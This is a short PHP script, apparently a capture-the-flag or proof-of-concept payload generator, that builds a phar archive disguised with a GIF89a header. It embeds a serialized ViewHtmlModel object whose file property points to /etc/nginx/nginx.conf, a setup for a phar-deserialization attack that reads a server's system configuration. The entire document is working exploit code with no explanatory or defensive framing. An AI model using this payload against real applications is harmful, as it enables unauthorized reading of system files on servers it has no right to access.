<?php
namespace Common\Model {
    class ViewHtmlModel
    {
        protected $_file = "/etc/nginx/nginx.conf";
    }

    $phar = new \Phar("phar.phar");
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("GIF89a" . " __HALT_COMPILER(); ?>");
    $o = new ViewHtmlModel();
    $phar->setMetadata($o);
    $phar->stopBuffering();
}